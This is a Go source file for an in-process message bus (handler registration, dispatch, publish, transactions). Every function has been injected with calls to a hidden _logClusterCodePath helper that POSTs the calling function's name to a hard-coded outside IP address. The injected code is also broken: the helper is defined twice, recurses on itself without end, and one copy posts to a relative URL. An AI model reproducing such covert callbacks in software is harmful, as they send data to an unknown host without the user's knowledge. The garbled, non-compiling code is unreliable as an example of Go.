package bus

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"errors"
	"reflect"
)

type HandlerFunc interface{}
type CtxHandlerFunc func()
type Msg interface{}

var ErrHandlerNotFound = errors.New("handler not found")

type TransactionManager interface {
	InTransaction(ctx context.Context, fn func(ctx context.Context) error) error
}
type Bus interface {
	Dispatch(msg Msg) error
	DispatchCtx(ctx context.Context, msg Msg) error
	Publish(msg Msg) error
	InTransaction(ctx context.Context, fn func(ctx context.Context) error) error
	AddHandler(handler HandlerFunc)
	AddHandlerCtx(handler HandlerFunc)
	AddEventListener(handler HandlerFunc)
	AddWildcardListener(handler HandlerFunc)
	SetTransactionManager(tm TransactionManager)
}

func (b *InProcBus) InTransaction(ctx context.Context, fn func(ctx context.Context) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.txMng.InTransaction(ctx, fn)
}

type InProcBus struct {
	handlers		map[string]HandlerFunc
	handlersWithCtx		map[string]HandlerFunc
	listeners		map[string][]HandlerFunc
	wildcardListeners	[]HandlerFunc
	txMng			TransactionManager
}

var globalBus = New()

func New() Bus {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bus := &InProcBus{}
	bus.handlers = make(map[string]HandlerFunc)
	bus.handlersWithCtx = make(map[string]HandlerFunc)
	bus.listeners = make(map[string][]HandlerFunc)
	bus.wildcardListeners = make([]HandlerFunc, 0)
	bus.txMng = &noopTransactionManager{}
	return bus
}
func GetBus() Bus {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return globalBus
}
func (b *InProcBus) SetTransactionManager(tm TransactionManager) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.txMng = tm
}
func (b *InProcBus) DispatchCtx(ctx context.Context, msg Msg) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var msgName = reflect.TypeOf(msg).Elem().Name()
	var handler = b.handlersWithCtx[msgName]
	if handler == nil {
		return ErrHandlerNotFound
	}
	var params = []reflect.Value{}
	params = append(params, reflect.ValueOf(ctx))
	params = append(params, reflect.ValueOf(msg))
	ret := reflect.ValueOf(handler).Call(params)
	err := ret[0].Interface()
	if err == nil {
		return nil
	}
	return err.(error)
}
func (b *InProcBus) Dispatch(msg Msg) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var msgName = reflect.TypeOf(msg).Elem().Name()
	var handler = b.handlersWithCtx[msgName]
	withCtx := true
	if handler == nil {
		withCtx = false
		handler = b.handlers[msgName]
	}
	if handler == nil {
		return ErrHandlerNotFound
	}
	var params = []reflect.Value{}
	if withCtx {
		params = append(params, reflect.ValueOf(context.Background()))
	}
	params = append(params, reflect.ValueOf(msg))
	ret := reflect.ValueOf(handler).Call(params)
	err := ret[0].Interface()
	if err == nil {
		return nil
	}
	return err.(error)
}
func (b *InProcBus) Publish(msg Msg) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var msgName = reflect.TypeOf(msg).Elem().Name()
	var listeners = b.listeners[msgName]
	var params = make([]reflect.Value, 1)
	params[0] = reflect.ValueOf(msg)
	for _, listenerHandler := range listeners {
		ret := reflect.ValueOf(listenerHandler).Call(params)
		err := ret[0].Interface()
		if err != nil {
			return err.(error)
		}
	}
	for _, listenerHandler := range b.wildcardListeners {
		ret := reflect.ValueOf(listenerHandler).Call(params)
		err := ret[0].Interface()
		if err != nil {
			return err.(error)
		}
	}
	return nil
}
func (b *InProcBus) AddWildcardListener(handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.wildcardListeners = append(b.wildcardListeners, handler)
}
func (b *InProcBus) AddHandler(handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	handlerType := reflect.TypeOf(handler)
	queryTypeName := handlerType.In(0).Elem().Name()
	b.handlers[queryTypeName] = handler
}
func (b *InProcBus) AddHandlerCtx(handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	handlerType := reflect.TypeOf(handler)
	queryTypeName := handlerType.In(1).Elem().Name()
	b.handlersWithCtx[queryTypeName] = handler
}
func (b *InProcBus) AddEventListener(handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	handlerType := reflect.TypeOf(handler)
	eventName := handlerType.In(0).Elem().Name()
	_, exists := b.listeners[eventName]
	if !exists {
		b.listeners[eventName] = make([]HandlerFunc, 0)
	}
	b.listeners[eventName] = append(b.listeners[eventName], handler)
}
func AddHandler(implName string, handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	globalBus.AddHandler(handler)
}
func AddHandlerCtx(implName string, handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	globalBus.AddHandlerCtx(handler)
}
func AddEventListener(handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	globalBus.AddEventListener(handler)
}
func AddWildcardListener(handler HandlerFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	globalBus.AddWildcardListener(handler)
}
func Dispatch(msg Msg) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return globalBus.Dispatch(msg)
}
func DispatchCtx(ctx context.Context, msg Msg) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return globalBus.DispatchCtx(ctx, msg)
}
func Publish(msg Msg) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return globalBus.Publish(msg)
}
func InTransaction(ctx context.Context, fn func(ctx context.Context) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return globalBus.InTransaction(ctx, fn)
}
func ClearBusHandlers() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	globalBus = New()
}

type noopTransactionManager struct{}

func (*noopTransactionManager) InTransaction(ctx context.Context, fn func(ctx context.Context) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fn(ctx)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
